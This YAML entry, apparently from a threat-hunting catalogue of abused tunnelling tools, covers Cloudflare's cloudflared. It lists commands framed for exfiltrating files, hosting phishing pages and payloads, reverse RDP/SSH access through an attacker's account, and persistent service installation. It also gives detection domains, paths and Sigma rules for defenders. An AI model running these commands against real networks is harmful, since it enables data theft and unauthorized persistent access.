---
Name: Cloudflared
Description: Cloudflared is provided by CloudFlare which is a cyber security company. This tool works in a similar fashion to others and allows insiders as well as threat actors for data exfiltration. Formerly was named Argo Tunnel.
Author: Kamran Saifullah
Created: 2024-10-05
Commands:
  - Command: cloudflared.exe tunnel --url <IP>:<PORT>
    Description: Quick Tunnel on Windows. Generates a random *.trycloudflare.com link, no account needed. A local server on the same port is required to exfiltrate the data.
    Usecase: Exposing local file system over the internet.
    Category: exfiltrate
    Privileges: User
    OperatingSystem: Windows

  - Command: ./cloudflared tunnel --url http://localhost:<PORT> --no-autoupdate
    Description: Quick Tunnel on Linux/macOS. Same behaviour as the Windows binary; the binary name has no extension and is often renamed.
    Usecase: Exposing local file system over the internet.
    Category: exfiltrate
    Privileges: User
    OperatingSystem: Linux, Mac

  - Command: cloudflared tunnel --url <IP>:<PORT>
    Description: By hosting a local server running a Phishing Website it is possible to expose it via CloudFlare URLs/Domains.
    Usecase: Hosting phishing sites locally and exposing them via CloudFlare URLs.
    Category: Phishing
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: cloudflared tunnel --url <IP>:<PORT>
    Description: By simply hosting malicious binaries/payloads, it is possible to expose them via CloudFlare domains.
    Usecase: Hosting malicious binaries/payloads locally and exposing them via CloudFlare URLs.
    Category: Download
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: cloudflared tunnel run --token <TUNNEL_TOKEN>
    Description: Runs a named tunnel that was created in the attacker's own Cloudflare account. The token carries the whole configuration, so ingress rules (RDP, SSH, SMB, HTTP) are defined remotely and nothing useful is visible in the command line or on disk.
    Usecase: Reverse access to internal services such as RDP/SSH through an attacker-controlled Cloudflare account.
    Category: shell-access
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: cloudflared service install <TUNNEL_TOKEN>
    Description: Installs cloudflared as a service (Windows service, systemd unit or launchd agent) that reconnects the named tunnel at every boot.
    Usecase: Persistent reverse tunnel into the network.
    Category: persistence
    Privileges: Administrator/root
    OperatingSystem: Windows, Mac, Linux

  - Command: cloudflared access tcp --hostname <HOSTNAME> --url 127.0.0.1:<LOCAL_PORT>
    Description: Client side of a tunnel. Binds a local port and forwards it to a service published behind a Cloudflare tunnel.
    Usecase: Reaching an operator-published service (for example SSH or RDP) from the compromised host or from the operator's host.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Mac, Linux
Full_Path:
  - Path: Downloaded version of cloudflared, which gets executed anywhere on the system.
  - Filename: cloudflared.exe
  - Filename: cloudflared
  - Filename: cloudflared-windows-amd64.exe
  - Filename: cloudflared-linux-amd64
  - Path: '%USERPROFILE%\.cloudflared\ (config.yml, cert.pem, <TUNNEL-UUID>.json)'
  - Path: '~/.cloudflared/ and /etc/cloudflared/ (config.yml, cert.pem, <TUNNEL-UUID>.json)'
  - Path: /etc/systemd/system/cloudflared.service
Detection:
  - Domain: '*.trycloudflare.com'
  - Domain: 'api.trycloudflare.com'
  - Domain: '*.cfargotunnel.com'
  - Domain: '*.cftunnel.com'
  - Domain: 'region1.v2.argotunnel.com'
  - Domain: 'region2.v2.argotunnel.com'
  - Domain: '*.argotunnel.com'
  - URL: 'https://api.trycloudflare.com/tunnel'
  - URL: 'https://github.com/cloudflare/cloudflared/releases/latest/download/*'
  - Command: Execution of the binary with the "tunnel" subcommand and --url, run, --token or --no-autoupdate arguments, regardless of the file name.
  - Command: Execution of cloudflared "service install", or creation of a cloudflared systemd unit, launchd agent or Windows service.
  - Command: Outbound TCP/UDP 7844 (QUIC/HTTP2 to the Cloudflare edge) from a non-browser process.
  - Sigma: https://github.com/LOTTunnels/LOTTunnels.github.io/blob/main/detections/sigma/proc_creation_cloudflared_tunnel_execution.yml
  - Sigma: https://github.com/LOTTunnels/LOTTunnels.github.io/blob/main/detections/sigma/dns_query_cloudflared_tunnel_domains.yml
  - Sigma: https://github.com/LOTTunnels/LOTTunnels.github.io/blob/main/detections/sigma/win_system_cloudflared_service_install.yml
  - Sigma: https://github.com/LOTTunnels/LOTTunnels.github.io/blob/main/detections/sigma/file_event_lnx_cloudflared_service_unit.yml
Resources:
  - Link: https://defr0ggy.github.io/research/Abusing-Cloudflared-A-Proxy-Service-To-Host-&-Share-Apps/
  - Link: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/
Acknowledgement:
  - Person: Kamran Saifullah
    Handle: '@deFr0ggy'
  - Person: Kirill Magaskin
    Handle: '@k1rpi7ch'
---
